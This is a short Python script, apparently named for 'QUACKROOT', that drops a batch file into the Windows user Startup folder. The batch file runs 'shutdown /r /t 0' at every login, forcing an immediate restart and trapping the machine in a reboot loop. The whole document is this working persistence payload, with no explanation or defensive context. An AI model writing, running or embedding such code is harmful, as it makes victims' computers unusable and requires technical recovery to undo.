import datetime
import os
import shutil
from datetime import datetime as dt

cmd_script = "@echo off\nshutdown /r /t 0"

appdata = os.getenv("APPDATA")
if not appdata:
    raise RuntimeError("Cannot determine AppData directory")
startup = os.path.join(
    appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
)
if not startup:
    raise RuntimeError("Cannot determine Startup directory")

cmd_path = os.path.join(startup, "QUACKROOT.cmd")

files = [(cmd_path, cmd_script)]


def make_backup(path):
    if os.path.exists(path):
        bak = path + ".bak"
        shutil.copy2(path, bak)


def ensure_dir_for_file(path):
    d = os.path.dirname(path)
    if d and not os.path.exists(d):
        os.makedirs(d, exist_ok=True)


def create(path, content):
    make_backup(path)
    ensure_dir_for_file(path)
    with open(path, "x", encoding="utf-8") as f:
        f.write(content)


if __name__ == "__main__":
    for path, content in files:
        create(path, content)
